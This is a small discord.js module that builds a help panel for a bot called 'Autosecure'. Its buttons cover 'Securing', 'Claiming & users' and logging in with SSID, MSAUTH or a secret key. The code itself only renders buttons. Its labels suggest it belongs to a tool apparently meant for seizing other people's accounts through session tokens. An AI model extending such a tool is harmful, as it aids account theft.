const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');

function createhelppanel() {
  const embed = new EmbedBuilder()
    .setTitle('Autosecure info')
    .setDescription("Select a button below to get more information on Autosecure. If you're still unsure, make a ticket ")
    .setColor(13158600)
  const buttons = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('starting_bot').setLabel('Autosecure Full Setup Guide').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('securing').setLabel('Securing').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('responses').setLabel('Bot responses').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('login_msauth').setLabel('Login with MSAUTH').setStyle(ButtonStyle.Primary)
  );

  const buttons2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('emails').setLabel('Emails').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('seeclaiming2').setLabel('Claiming & users').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('ssidhelp').setLabel('Login with SSID').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('secret_key').setLabel('Login with Secret key').setStyle(ButtonStyle.Primary)
  );

  const buttons3 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('configbutton').setLabel('Config').setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId("multiplayerhelp").setLabel("Couldn't login: null.").setStyle(ButtonStyle.Primary)
  );



  const msg = { embeds: [embed], components: [buttons, buttons2, buttons3] };
  return msg;
}

module.exports = { createhelppanel };
